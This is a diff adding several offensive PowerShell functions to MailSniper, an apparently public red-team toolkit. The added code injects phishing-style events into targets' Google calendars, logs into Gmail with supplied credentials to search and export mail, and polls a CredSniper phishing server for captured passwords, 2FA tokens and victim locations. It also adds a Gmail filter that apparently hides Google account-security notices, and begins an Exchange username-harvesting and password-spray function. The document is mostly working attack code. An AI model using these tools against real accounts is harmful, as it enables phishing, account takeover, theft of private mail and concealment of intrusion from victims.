@@ -318,7 +318,7 @@ $TASource=@'
   }
   else 
   {
-    $SMTPAddresses = Get-Mailbox -ResultSize unlimited | Select Name -ExpandProperty EmailAddresses
+    $SMTPAddresses = Get-Mailbox -ResultSize unlimited | Select Name -ExpandProperty PrimarySmtpAddress
     $AllMailboxes = $SMTPAddresses -replace ".*:"
     Write-Host "[*] The total number of mailboxes discovered is: " $AllMailboxes.count
   }
@@ -3189,75 +3189,753 @@ function Get-ADUsernameFromEWS{
    }
 }
 
+Function Invoke-InjectGEventAPI{
+
+<#
+
+  .SYNOPSIS
+
+    This module will connect to Google's API using an access token and inject a calendar event into a target's calendar.
+
+    MailSniper Function: Invoke-InjectGEventAPI
+    Author: Beau Bullock (@dafthack) & Michael Felch (@ustayready)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+  .DESCRIPTION
+
+    This module will connect to Google's API using an access token and inject a calendar event into a target's calendar.
+    
+    Steps to get a Google API Access Token needed for connecting to the API
+    A. Login to Google
+    B. Go to https://console.developers.google.com/flows/enableapi?apiid=calendar&pli=1
+    C. Create/select a Project and agree to ToS and continue
+    D. Click "Go to Credentials"
+    E. On the "Add credentials to your project" page click cancel
+    F. At the top of the page, select the "OAuth consent screen" tab. Select an Email address, enter a Product name if not already set, and click the Save button.
+    G. Select the Credentials tab, click the Create credentials button and select OAuth client ID.
+    H. Select the application type Web application, under "Authorized redirect URIs" paste in the following address: https://developers.google.com/oauthplayground". Then, click the Create button.
+    I. Copy your "Client ID" and "Client Secret"
+    J. Navigate here: https://developers.google.com/oauthplayground/
+    K. Click the "gear icon" in the upper right corner and check the box to "Use your own OAuth credentials". Enter the OAuth2 client ID and OAuth2 client secret in the boxes.
+    L. Make sure that "OAuth flow" is set to Server-side, and "Access Type" is set to offline.
+    M. Select the "Calendar API v3" dropdown and click both URLs to add them to scope. Click Authorize APIs
+    O. Select the account you want to authorize, then click Allow. (If there is an error such as "Error: redirect_uri_mismatch" then it's possible the changes haven't propagated yet. Just wait a few minutes, hit the back button and try to authorize again.)
+    P. You should now be at "Step 2: Exchange authorization code for tokens." Click the "Exchange authorization code for tokens button". The "Access token" is item we need for accessing the API. Copy the value of the "Access token."
+
+
+  .PARAMETER PrimaryEmail  
+        
+        Email address of the Google account you are doing the injection as. (Attacker email address)     
+
+  .PARAMETER AccessToken      
+
+        Google API Access Token. See the steps above to generate one of these.
+        
+  .PARAMETER EventTitle
+
+        Title of the Google event.
+
+  .PARAMETER Targets 
+
+        Comma-seperated list of email addresses to inject the event into.
+
+  .PARAMETER EventLocation
+
+        Location field for the event.
+
+  .PARAMETER EventDescription
+
+        Description field for the event.
+
+  .PARAMETER StartDateTime  
+  
+        Start date and time for the event in the format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:00:00 for October 22, 2017 at 6:00:00 PM
+
+  .PARAMETER EndDateTime 
+
+        End date and time for the event in the format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:30:00 for October 22, 2017 at 6:30:00 PM
+  
+  .PARAMETER TimeZone  
+  
+        Time zone for the event in the format "America/New_York"
+
+  .PARAMETER allowModify 
+  
+        If set to true allows targets to modify the calendar entry
+
+  .PARAMETER allowInvitesOther  
+  
+        If set to true allows targets to invite others to the calendar entry
+
+  .PARAMETER showInvitees 
+  
+        If set to true will show all guests added to the event
+     
+  .PARAMETER ResponseStatus 
+  
+        "accepted"  #Can be "needsAction", "declined", "tentative", or "accepted"
+
+
+    .EXAMPLE
+    PS C:\> Invoke-InjectGEventAPI -PrimaryEmail your-api-email-address@gmail.com -AccessToken 'Insert your access token here' -Targets "CEOofEvilCorp@gmail.com,CTOofEvilCorp@gmail.com,CFOofEvilCorp.com" -StartDateTime 2017-10-22T17:20:00 -EndDateTime 2017-10-22T17:30:00 -EventTitle "All Hands Meeting" -EventDescription "Please review the agenda at the URL below prior to the meeting." -EventLocation "Interwebz"
+
+
+#>
+    Param
+    (
+        [Parameter(Position = 0, Mandatory = $true)]
+        [string]
+        $PrimaryEmail = "",       
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $AccessToken = "",        
+        
+        [Parameter(Position = 2, Mandatory = $false)]
+        [string]
+        $EventTitle = "",
+
+        [Parameter(Position = 3, Mandatory = $true)]
+        [string]
+        $Targets = "", 
+
+        [Parameter(Position = 4, Mandatory = $false)]
+        [string]
+        $EventLocation = "",
+
+        [Parameter(Position = 5, Mandatory = $false)]
+        [string]
+        $EventDescription = "",
+
+        [Parameter(Position = 6, Mandatory = $true)]
+        [string]
+        $StartDateTime = "", #format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:00:00 for October 22, 2017 at 6:00:00 PM
+
+        [Parameter(Position = 7, Mandatory = $true)]
+        [string]
+        $EndDateTime = "",   #format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:30:00 for October 22, 2017 at 6:30:00 PM
+
+        [Parameter(Position = 8, Mandatory = $false)]
+        [string]
+        $TimeZone = "America/New_York",
+
+        [Parameter(Position = 9, Mandatory = $false)]
+        [string]
+        $allowModify = "false", #if set to true allows targets to modify the calendar entry
+
+        [Parameter(Position = 10, Mandatory = $false)]
+        [string]
+        $allowInvitesOther = "true", #if set to true allows targets to invite others to the calendar entry
+
+        [Parameter(Position = 11, Mandatory = $false)]
+        [string]
+        $showInvitees = "false",  #if set to true will show all guests added to the event
+     
+        [Parameter(Position = 12, Mandatory = $false)]
+        [string]
+        $ResponseStatus = "accepted"  #Can be "needsAction", "declined", "tentative", or "accepted"
+
+    )
+
+        #Crafting the JSON body
+
+        $targetsarray = $targets -split ","
+        foreach($target in $targetsarray)
+        {
+            $GEventBody = @{
+                kind = "calendar#event";
+                start = @{ dateTime = "$StartDateTime"; timeZone = "$TimeZone"};
+                end = @{ dateTime = "$EndDateTime"; timeZone = "$TimeZone"};
+                summary = "$EventTitle";
+                description = "$EventDescription";
+                location = "$EventLocation";
+                attendees = @(
+                    @{email= "$Target"; responseStatus = "$ResponseStatus"}
+                    );
+                guestsCanInviteOthers = "$allowInvitesOther";
+                guestsCanSeeOtherGuests = "$showInvitees";
+                guestsCanModify = "$allowModify"
+
+            }
+
+            $GEventHeaders = @{'Accept'='*/*';'Content-Type'='application/json';'Authorization'= "Bearer $AccessToken"}
+
+            #Injecting event into calendar
+            Write-Output "[*] Now injecting event into target calendar(s): $Target"
+            $CalendarInjection = Invoke-RestMethod -Uri "https://www.googleapis.com/calendar/v3/calendars/$PrimaryEmail/events" -Method POST -Headers $GEventHeaders -Body (ConvertTo-Json $GEventBody)
+        }
+}
+
+Function Invoke-InjectGEvent{
+
+<#
+.SYNOPSIS
+
+    This module will connect to Google using a set of user credentials and inject a calendar event into a target's calendar.
+
+    MailSniper Function: Invoke-InjectGEvent
+    Author: Beau Bullock (@dafthack) & Michael Felch (@ustayready)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+  .DESCRIPTION
+
+    This module will connect to Google using a set of user credentials and inject a calendar event into a target's calendar.
+   
+  .PARAMETER EmailAddress  
+        
+        Email address of the Google account you are doing the injection as. (Attacker email address)     
+
+  .PARAMETER Password      
+
+        Password for the account to auth to Google.
+        
+  .PARAMETER EventTitle
+
+        Title of the Google event.
+
+  .PARAMETER Targets 
+
+        Comma-seperated list of email addresses to inject the event into.
+
+  .PARAMETER EventLocation
+
+        Location field for the event.
+
+  .PARAMETER EventDescription
+
+        Description field for the event.
+
+  .PARAMETER StartDateTime  
+  
+        Start date and time for the event in the format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM
+
+  .PARAMETER EndDateTime 
+
+        End date and time for the event in the format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM
+  
+  .PARAMETER TimeZone  
+  
+        Time zone for the event in the format "America/New_York"
+
+  .PARAMETER allowModify 
+  
+        If set to true allows targets to modify the calendar entry
+
+  .PARAMETER allowInvitesOther  
+  
+        If set to true allows targets to invite others to the calendar entry
+
+  .PARAMETER showInvitees 
+  
+        If set to true will show all guests added to the event
+     
+
+    .EXAMPLE
+    PS C:\> Invoke-InjectGEvent -EmailAddress your-google-email-address@gmail.com -Password 'Password for the Google Account' -Targets "CEOofEvilCorp@gmail.com,CTOofEvilCorp@gmail.com,CFOofEvilCorp.com" -StartDateTime 20171022T172000 -EndDateTime 20171022T173000 -EventTitle "All Hands Meeting" -EventDescription "Please review the agenda at the URL below prior to the meeting." -EventLocation "Interwebz"
+
+
+#>
+
+
+    Param
+    (
+        
+        [Parameter(Position = 0, Mandatory = $true)]
+        [string]
+        $EmailAddress = "",
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $Password = "",
+
+        [Parameter(Position = 2, Mandatory = $false)]
+        [string]
+        $EventTitle = "",
+
+        [Parameter(Position = 3, Mandatory = $true)]
+        [string]
+        $Targets = "",
+
+        [Parameter(Position = 4, Mandatory = $false)]
+        [string]
+        $EventLocation = "",
+
+        [Parameter(Position = 5, Mandatory = $false)]
+        [string]
+        $EventDescription = "",
+
+        [Parameter(Position = 6, Mandatory = $true)]
+        [string]
+        $StartDateTime = "", #format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM
+
+        [Parameter(Position = 7, Mandatory = $true)]
+        [string]
+        $EndDateTime = "",   #format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM
+
+        [Parameter(Position = 8, Mandatory = $false)]
+        [string]
+        $TimeZone = "America/New_York",
+
+        [Parameter(Position = 9, Mandatory = $false)]
+        [string]
+        $allowModify = "false", #if set to true allows targets to modify the calendar entry
+
+        [Parameter(Position = 10, Mandatory = $false)]
+        [string]
+        $allowInvitesOther = "true", #if set to true allows targets to invite others to the calendar entry
+
+        [Parameter(Position = 11, Mandatory = $false)]
+        [string]
+        $showInvitees = "false",  #if set to true will show all guests added to the event
+
+        [Parameter(Position = 12, Mandatory = $false)]
+        [string]
+        $userStatus = "false",  
+
+        [Parameter(Position = 13, Mandatory = $false)]
+        [string]
+        $createdBySet = "false"  
+
+    )
+
+        #Start a new Google session and input the email address of the user who will be creating the event
+        $SessionRequest = Invoke-WebRequest -Uri 'https://accounts.google.com/signin' -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $EmailForm = $SessionRequest.Forms[0]
+        $EmailForm.Fields["Email"]= $EmailAddress
+        $EmailSubmitRequest = Invoke-WebRequest -Uri ("https://accounts.google.com/signin/v1/lookup") -WebSession $googlesession -Method POST -Body $EmailForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+
+        #Submit the authentication for the user and maintain a valid session in $googlesession
+        $PasswordForm = $EmailSubmitRequest.Forms[0]
+        $PasswordForm.Fields["Email"]= $EmailAddress
+        $PasswordForm.Fields["Passwd"]= $Password
+        Write-Output "[*] Now logging into account with provided credentials"
+        $PasswordUrl = "https://accounts.google.com/signin/challenge/sl/password"
+        $PasswordSubmitRequest = Invoke-WebRequest -Uri $PasswordUrl -WebSession $googlesession -Method POST -Body $PasswordForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $cookies = $googlesession.Cookies.GetCookies($PasswordUrl)
+        foreach ($cookie in $cookies)
+        {
+            if (($cookie.name -eq 'SID') -and ($cookie.value -ne ""))
+            {
+                $PrimarySIDExists = $true
+            }
+        }
+        if ($PrimarySIDExists)
+        {
+            Write-Output "[*] Authentication appears to be successful"
+        }
+        else
+        {
+            Write-Output "[*] Authentication appears to have failed. Check the credentials."       
+            break
+        }
+
+        #Navigate to the Google Calendar and obtain the 'secid' that is necessary for POSTing events
+        Write-Output "[*] Obtaining 'secid' for POSTing to calendar"
+        $CalendarLoad = Invoke-WebRequest -Uri ("https://calendar.google.com/calendar/render") -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'='text/html, application/xhtml+xml, image/jxr, */*'}
+        #$secidline = $CalendarLoad.tostring() -split "[`r`n]" | select-string 'null,null,null,0]'
+        $CalendarLoad.tostring() -match "(?<=window\['INITIAL_DATA'\]\ =\ )(?s).*(?=\n;)" | out-null
+        $json = ConvertFrom-Json $Matches[0]
+        $secid = $json[26]
+
+        #$GEventParams = @{'sf'='true';'output'='js';'action'='CREATE';'useproto'='true';'add'=$Targets;'crm'='BUSY';'icc'='DEFAULT';'sprop'='goo.allowModify:false';'pprop'='eventColor:none';'text'=$EventTitle;'location'=$EventLocation;'details'=$EventDescription;'src'='';'dates'=($StartDateTime + "/" + $EndDateTime);'unbounded'='false';'scp'='ONE';'hl'='en';'stz'=$TimeZone;'secid'=$secid}
+        $Dates = ($StartDateTime + "/" + $EndDateTime)
+        $GEventHeaders = @{'Accept'='*/*';'X-If-No-Redirect'='1';'X-Is-Xhr-Request'='1';'Content-Type'='application/x-www-form-urlencoded;charset=utf-8';'Referer'='https://calendar.google.com/calendar/render?pli=1';'Accept-Language'='en-US';'Accept-Encoding'='gzip; deflate';'User-Agent'='Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv=11.0) like Gecko';'Host'='calendar.google.com';'Cache-Control'='no-cache'}
+        $GEventParams = "text=$EventTitle&output=js&useproto=true&hl=en&dates=$Dates&location=$EventLocation&pprop=eventColor%3Anone&add=$Targets&status=1&crm=BUSY&icc=DEFAULT&scp=ONE&action=CREATE&details=$EventDescription&sprop=goo.allowModify%3A$allowModify&sprop=goo.allowInvitesOther:$AllowInvitesOther&sprop=goo.showInvitees:$ShowInvitees&sprop=goo.userStatus:$userStatus&sprop=goo.createdBySet:$createdBySet&stz=$TimeZone&secid=$secid&sf=true&src=&unbounded=false"
+
+        #Injecting event into calendar
+        Write-Output "[*] Now injecting event into target calendar(s): $Targets"
+        $CalendarInjection = Invoke-WebRequest -Uri "https://calendar.google.com/calendar/event" -WebSession $googlesession -Method POST -Headers $GEventHeaders -Body $GEventParams
+
+        $EventCreationResponse = $CalendarInjection.RawContent -split '\\"'
+        $EventID = $EventCreationResponse[1]
+
+        #Entry verification
+        $CheckingEventExists = Invoke-WebRequest -Uri "https://calendar.google.com/calendar/event" -WebSession $googlesession -Method POST -Headers $GEventHeaders -Body "eid=$EventID&sf=true&secid=$secid"
+        [xml]$EventXmlOutput = $CheckingEventExists.Content
+        
+        if($EventXmlOutput.eventpage.eid.value -ne $EventID)
+        {
+            Write-Output "`nLooks like something may have gone wrong. Maybe login to G-Calendar directly and check to see if the event was created."
+        }
+        else
+        {
+            Write-Output "`n[*] Success! The details for the event are below`n"
+            $confirmedeid = $EventXmlOutput.eventpage.eid.value
+            $confirmedtitle = $EventXmlOutput.eventpage.summary.value
+            $confirmedlocation = $EventXmlOutput.eventpage.location.value
+            $confirmeddescription = $EventXmlOutput.eventpage.description.value
+            $confirmeddates = $EventXmlOutput.eventpage.dates.display
+            $confirmedtimezone = $EventXmlOutput.eventpage.timezone.value
+            $attendeelist = $EventXmlOutput.eventpage.attendees.attendee.principal.display
+            $eventcreator = $EventXmlOutput.eventpage.creator.principal.value
+
+            Write-Output "[+] Title : $confirmedtitle"
+            Write-Output "[+] Location : $confirmedlocation"
+            Write-Output "[+] Description : $confirmeddescription"
+            Write-Output "[+] Dates : $confirmeddates"
+            Write-Output "[+] Timezone : $confirmedtimezone"
+            Write-Output "[+] Attendees : $attendeelist"
+            Write-Output "[+] Creator : $eventcreator"
+            Write-Output "[+] EventID : $confirmedeid"
+        }
+}
+
+Function Invoke-SearchGmail{
+<#
+    .SYNOPSIS
+
+    This module will connect to Google using a set of user credentials and search a user's inbox for certain terms.
+
+    MailSniper Function: Invoke-SearchGmail
+    Author: Beau Bullock (@dafthack) & Michael Felch (@ustayready)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+  .DESCRIPTION
+
+    This module will connect to Google using a set of user credentials and search a user's inbox for certain terms.
+
+        .EXAMPLE
+        
+            PS C:> Invoke-SearchGmail -EmailAddress email@gmail.com -Password Summer2017 -Search search-term -OutputCsv out.csv
+#>
+
+
+    Param
+    (
+
+        [Parameter(Position = 0, Mandatory = $true)]
+        [string]
+        $EmailAddress = "",
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $Password = "",
+
+        [Parameter(Position = 2, Mandatory = $true)]
+        [string]
+        $Search = "",
+
+        [Parameter(Position = 3, Mandatory = $true)]
+        [string]
+        $OutputCsv = ""
+    )
+
+        #Start a new Google session and input the email address of the user who will be creating the event
+        $SessionRequest = Invoke-WebRequest -Uri 'https://accounts.google.com/signin' -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $EmailForm = $SessionRequest.Forms[0]
+        $EmailForm.Fields["Email"]= $EmailAddress
+        $EmailSubmitRequest = Invoke-WebRequest -Uri ("https://accounts.google.com/signin/v1/lookup") -WebSession $googlesession -Method POST -Body $EmailForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+
+        #Submit the authentication for the user and maintain a valid session in $googlesession
+        $PasswordForm = $EmailSubmitRequest.Forms[0]
+        $PasswordForm.Fields["Email"]= $EmailAddress
+        $PasswordForm.Fields["Passwd"]= $Password
+        Write-Output "[*] Now logging into account with provided credentials"
+        $PasswordUrl = "https://accounts.google.com/signin/challenge/sl/password"
+        $PasswordSubmitRequest = Invoke-WebRequest -Uri $PasswordUrl -WebSession $googlesession -Method POST -Body $PasswordForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $cookies = $googlesession.Cookies.GetCookies($PasswordUrl)
+        foreach ($cookie in $cookies)
+        {
+            if (($cookie.name -eq 'SID') -and ($cookie.value -ne ""))
+            {
+                $PrimarySIDExists = $true
+            }
+        }
+        if ($PrimarySIDExists)
+        {
+            Write-Output "[*] Authentication appears to be successful"
+        }
+        else
+        {
+            Write-Output "[*] Authentication appears to have failed. Check the credentials."
+            break
+        }
+
+        #Get ik param needed in search
+        Write-Output "[*] Now searching Gmail account $EmailAddress for: $Search"
+        $GetIKParam = 's_jr=[null,[[null,null,null,null,null,null,[null,true,false]],[null,[null,"test",0,null,30,null,null,null,false,[],[]]]],2,null,null,null,""]'
+        $GetGmailSession = Invoke-WebRequest -Uri "https://mail.google.com/mail" -WebSession $googlesession
+        $GetIKRequest = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/s/?v=or" -WebSession $googlesession -Method POST -Body $GetIKParam
+        $GetIKRequest.Content -match @'
+(?<=user key\ ')[A-Za-z0-9]*(?='\")
+'@ | Out-null
+        $ik = $Matches[0]
+        $SettingsLoad = Invoke-WebRequest -Uri ("https://mail.google.com/mail/u/0/#settings/filters") -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'='text/html, application/xhtml+xml, image/jxr, */*'}
+           
+        $SettingsLoad.tostring() -match '(?<=GM_ACTION_TOKEN=\").*(?=\";var)' | out-null
+        $at = $Matches[0]
+        
+        $SearchRequest = Invoke-WebRequest -WebSession $googlesession -Method Post -Uri "https://mail.google.com/mail/u/0/?ui=2&ik=$ik&at=$at&view=tl&start=0&num=1000&mb=0&rt=c&q=$search&search=query"
+
+        $SearchResultsJson = $SearchRequest.Content -split "\n"
+        $SearchJson = $SearchResultsJson[3]
+        $MainResultsJson = $SearchResultsJson[5]
+
+        $json1 = $SearchJson | ConvertFrom-Json
+        $finaljson = $MainResultsJson | ConvertFrom-Json
+
+        [int]$totalresults = $json1[5][2]
+        
+        Write-Output "[*] $totalresults emails found that match the search term $search."
+
+        Write-Output "[*] Getting email ids"
+        $i = 0
+        $emailids = @()
+        while ($i -lt $totalresults)
+        {
+            $emailids += $finaljson[0][2][$i][0]
+            $i++
+        }
+
+        $fullresultsarray = @()
+       
+
+        $count = 1
+        foreach ($eid in $emailids)
+        {
+            Write-Output "[*] Now checking email $count of $totalresults."
+            $EmailParam = "s_jr=[null,[[null,null,[null,`"$eid`",`"*`",false,true,true,null,null,null,null,null]]],2,null,null,null,`"$ik`"]"
+            $EmailRequest = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/s/?v=or" -WebSession $googlesession -Method POST -Body $EmailParam
+
+            $EmailJson = $EmailRequest.Content -split "&\["
+            $EmailJson = "[" + $EmailJson[1]
+            $emailfinaljson = $EmailJson | ConvertFrom-Json
+            $MailSubject = $emailfinaljson[1][0][3][1][5][0][5]
+            $MailSender = $emailfinaljson[1][0][3][1][5][0][7]
+            $MailReceiver = $emailfinaljson[1][0][3][1][5][0][8][0][1]
+            $MailBody = $emailfinaljson[1][0][3][1][5][0][3][0][2]
+
+            $EmailObject = New-Object System.Object
+            $EmailObject | Add-Member -Type NoteProperty -name Subject -Value $MailSubject
+            $EmailObject | Add-Member -Type NoteProperty -name Sender -Value $MailSender[1]
+            $EmailObject | Add-Member -Type NoteProperty -name Receiver -Value $MailReceiver
+            $EmailObject | Add-Member -Type NoteProperty -name Body -Value $MailBody
+            $fullresultsarray += $EmailObject
+
+            Write-Output "Subject: $MailSubject"
+            Write-Output "Sender: $MailSender"
+            Write-Output "Receiver: $MailReceiver"     
+          
+            Write-Output "`n"
+            $count++
+        }
+        
+
+        $fullresultsarray | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace "`n",'\n' -replace "`r",'\n' -replace ",",'&#44;'}
+        $fullresultsarray | Export-Csv -Encoding UTF8 $OutputCsv
+        Write-Output "[*] Results have been written to $OutputCsv."
+}
+
+Function Invoke-MonitorCredSniper{
+
+    Param
+    (
+        [Parameter(Position = 0, Mandatory = $true)]
+        [string]
+        $ApiToken = "",
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $CredSniper = "",
+
+        [Parameter(Position = 2, Mandatory = $false)]
+        [int]
+        $Interval = 1
+    )
+
+    Write-Output "[*] Initializing CredSniper monitor..."
+
+    # Collection of seen usernames
+    $Seen = New-Object System.Collections.ArrayList
+
+    # Stay Looping
+    while(1)
+    {
+        # Properly setup URI and make request to CredSniper API
+        $CredSniper = $CredSniper.trim('/')
+        $CredSniperRequest = Invoke-WebRequest -Uri "$CredSniper/creds/view?api_token=$ApiToken"
+        $CredsJson = $CredSniperRequest.Content | ConvertFrom-Json
+
+        # Loop through credentials from CredSniper
+        foreach($cred in $CredsJson.creds)
+        {
+            # CredSniper internal identifier for credential
+            $cred_id = $cred.cred_id
+
+            # IP Address of Victim
+            $ip_address = $cred.ip_address
+
+            # Username/Email captured
+            $username = $cred.username
+
+            # Password captured
+            $password = $cred.password
+
+            # GeoIP City
+            $city = $cred.city
+
+            # GeoIP Region/State
+            $region = $cred.region
+
+            # GeoIP Zip Code
+            $zip_code = $cred.zip_code
+
+            # 2FA Type (sms, authenticator, touchscreen, u2f)
+            $twofactor_type = $cred.two_factor_type
+
+            # 2FA Token
+            $twofactor_token = $cred.two_factor_token
+
+            # CredSniper internal marked as seen flag
+            $already_seen = $cred.seen
+
+            # Check to see if username has already been seen
+            If ($Seen -notcontains $username)
+            {
+                # Monitor if we have already seen this credential so we don't hit duplicates
+                $Seen.Add($username) | out-null
+
+                # Print output for user
+                Write-Output "[*] $username, $password, $twofactor_type, $twofactor_token, $city, $region, $zip_code"
+            }
+        }
+
+        # Sleep for a little while
+        Start-Sleep -seconds $Interval
+    }
+}
+
+Function Invoke-AddGmailRule{
+
+    Param
+    (
+
+        [Parameter(Position = 0, Mandatory = $true)]
+        [string]
+        $EmailAddress = "",
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $Password = ""
+    )
+
+        #Start a new Google session and input the email address of the user who will be creating the event
+        $SessionRequest = Invoke-WebRequest -Uri 'https://accounts.google.com/signin' -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $EmailForm = $SessionRequest.Forms[0]
+        $EmailForm.Fields["Email"]= $EmailAddress
+        $EmailSubmitRequest = Invoke-WebRequest -Uri ("https://accounts.google.com/signin/v1/lookup") -WebSession $googlesession -Method POST -Body $EmailForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+
+        #Submit the authentication for the user and maintain a valid session in $googlesession
+        $PasswordForm = $EmailSubmitRequest.Forms[0]
+        $PasswordForm.Fields["Email"]= $EmailAddress
+        $PasswordForm.Fields["Passwd"]= $Password
+        Write-Output "[*] Now logging into account with provided credentials"
+        $PasswordUrl = "https://accounts.google.com/signin/challenge/sl/password"
+        $PasswordSubmitRequest = Invoke-WebRequest -Uri $PasswordUrl -WebSession $googlesession -Method POST -Body $PasswordForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $cookies = $googlesession.Cookies.GetCookies($PasswordUrl)
+        foreach ($cookie in $cookies)
+        {
+            if (($cookie.name -eq 'SID') -and ($cookie.value -ne ""))
+            {
+                $PrimarySIDExists = $true
+            }
+        }
+        if ($PrimarySIDExists)
+        {
+            Write-Output "[*] Authentication appears to be successful"
+        }
+        else
+        {
+            Write-Output "[*] Authentication appears to have failed. Check the credentials."
+            break
+        }
+
+
+        #Parse 'ik' and 'at'
+        $SettingsLoad = Invoke-WebRequest -Uri ("https://mail.google.com/mail/u/0/#settings/filters") -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'='text/html, application/xhtml+xml, image/jxr, */*'}
+        Write-Output "[*] Obtaining 'ik' and 'at'"
+
+        $GetIKParam = 's_jr=[null,[[null,null,null,null,null,null,[null,true,false]],[null,[null,"test",0,null,30,null,null,null,false,[],[]]]],2,null,null,null,""]'
+        $GetGmailSession = Invoke-WebRequest -Uri "https://mail.google.com/mail" -WebSession $googlesession
+        $GetIKRequest = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/s/?v=or" -WebSession $googlesession -Method POST -Body $GetIKParam
+        $GetIKRequest.Content -match @'
+(?<=user key\ ')[A-Za-z0-9]*(?='\")
+'@ | out-null
+
+        $ik = $Matches[0]
+
+        $SettingsLoad.tostring() -match '(?<=GM_ACTION_TOKEN=\").*(?=\";var)' | out-null
+        $at = $Matches[0]
+
+        $GEventHeaders = @{'Accept'='*/*';'X-Same-Domain'='1';'Content-Type'='application/x-www-form-urlencoded;charset=utf-8';'Referer'='https://mail.google.com/render?pli=1';'Accept-Language'='en-US';'Accept-Encoding'='gzip; deflate';'User-Agent'='Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv=11.0) like Gecko';'Host'='mail.google.com';'Cache-Control'='no-cache'}
+        $GEventParams = "search=cf&cf1_from=no-reply%40accounts.google.com&cf1_sizeoperator=s_sl&cf1_sizeunit=s_smb&cf2_tr=true&"
+
+        #Adding rule
+        Write-Output "[*] Now adding filter rule into Gmail settings"
+        $RuleAdding = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/?ui=2&ik=$ik&jsver=a&rid=a&at=$at&view=up&act=cf&_reqid=a&pcd=1&cfact=a&cfinact=a&mb=0&rt=c&search=cf&cf1_from=no-reply%40accounts.google.com&cf1_sizeoperator=s_sl&cf1_sizeunit=s_smb" -WebSession $googlesession -Method POST -Headers $GEventHeaders -Body $GEventParams
+
+        #Rule verification
+        $CheckingRuleExists = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/#settings/filters" -WebSession $googlesession -Method GET -Headers $GEventHeaders
+        if($CheckingRuleExists.tostring() -match 'no-r<wbr>eply@accou<wbr>nts.google<wbr>.com')
+        {
+            Write-Output "`nLooks like something may have gone wrong. Maybe login to Gmail directly and check to see if the rule was created."
+        } else {
+            Write-Output "[*] Success! The rule has been added successfuly`n"
+        }
+}
+
 function Invoke-UsernameHarvestEAS {
 <#
   .SYNOPSIS
-
     This module will attempt to connect to an Exchange Active Sync (EAS) portal and harvest valid usernames. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
-
     MailSniper Function: Invoke-UsernameHarvestEAS
     Author: Steve Motts (@fugawi72) and Beau Bullock (@dafthack) **mostly a copy and paste of Fehrman/Bullock's Invoke-UsernameHarvestOWA function**
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
-
     .DESCRIPTION
-
         This module will attempt to harvest useranmes from an EAS portal. The module uses an anomaly where invalid usernames have a much greater response time than valid usernames, even if the password is invalid. The module uses a password that is likely to be invalid for all accounts. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
-
     .PARAMETER ExchHostname
-
         The hostname of the Exchange server to connect to.
  
     .PARAMETER OutFile
-
         Outputs the results to a text file.
-
     .PARAMETER UserList
-
         List of usernames 1 per line to to attempt to check for validity.
-
     .PARAMETER Password
-
         A single password to attempt a password spray with.
-
     .PARAMETER Domain
        
         Domain name to prepend to usernames
-
     .PARAMETER Threads
        
         Number of password spraying threads to run.
-
   
   .EXAMPLE
-
     C:\PS> Invoke-UsernameHarvestEAS -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile eas-valid-users.txt
-
     Description
     -----------
     This command will connect to the EAS server at https://mail.domain.com/Microsoft-Server-ActiveSync/ and attempt to harvest a list of valid usernames by password spraying the provided list of usernames with a single password over 1 thread and write to a file called eas-valid-users.txt.
-
 #>
   Param(
-
-
     [Parameter(Position = 0, Mandatory = $True)]
     [system.URI]
     $ExchHostname = "",
-
     [Parameter(Position = 1, Mandatory = $True)]
     [string]
     $OutFile = "",
-
     [Parameter(Position = 2, Mandatory = $True)]
     [string]
     $UserList = "",
-
     [Parameter(Position = 3, Mandatory = $True)]
     [string]
     $Domain = "",
-
 	[Parameter(Position = 4, Mandatory = $False)]
     [string]
     $Password = "",
